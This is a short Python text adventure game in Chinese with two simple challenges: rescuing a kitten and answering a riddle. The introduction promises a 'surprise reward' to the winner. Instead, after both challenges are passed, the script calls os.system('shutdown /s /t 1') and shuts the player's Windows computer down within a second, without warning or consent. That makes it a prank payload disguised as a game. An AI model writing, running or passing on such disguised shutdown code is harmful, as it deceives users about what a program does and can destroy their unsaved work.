import time
import os

def introduction():
    print("歡迎來到城市冒險遊戲！")
    time.sleep(1)
    print("你現在站在一個神秘的城市門口，你的任務是通過城市的各種挑戰。")
    time.sleep(1)
    print("每次成功通過一個挑戰，你都會獲得一個城市標誌。")
    time.sleep(1)
    print("成功獲得所有城市標誌，你就能進入城市中心，並且獲得驚喜獎勵！")
    time.sleep(1)

def challenge_1():
    print("\n挑戰 1: 解救一隻被困在樹上的小貓。")
    choice = input("你要使用梯子救下小貓嗎？(輸入yes或no): ").lower()
    if choice == "yes":
        print("太好了！你成功救下小貓。你獲得城市標誌 1！")
        return True
    else:
        print("你沒有救下小貓，挑戰失敗。")
        return False

def challenge_2():
    print("\n挑戰 2: 解開一個謎題門。")
    riddle = "我們每天都看到它，它在夜晚發光，卻不是太陽。是什麼？"
    answer = "月亮"
    
    guess = input(f"謎題: {riddle}\n你的答案是什麼？: ").lower()
    
    if guess == answer:
        print("你正確解開了謎題。你獲得城市標誌 2！")
        return True
    else:
        print("答案不正確，挑戰失敗。")
        return False

def main():
    introduction()

    if challenge_1():
        if challenge_2():
            print("\n恭喜你通過所有挑戰！你可以進入城市中心了。")
            time.sleep(2)
            print("城市中心的大門打開了，你進入了城市中心。")
            time.sleep(2)
            
            # 執行關機操作
            print("準備進行關機...")
            time.sleep(1)
            os.system('shutdown /s /t 1')
        else:
            print("很遺憾，你沒有通過所有挑戰。遊戲結束。")
    else:
        print("很遺憾，你沒有通過所有挑戰。遊戲結束。")

if __name__ == "__main__":
    main()
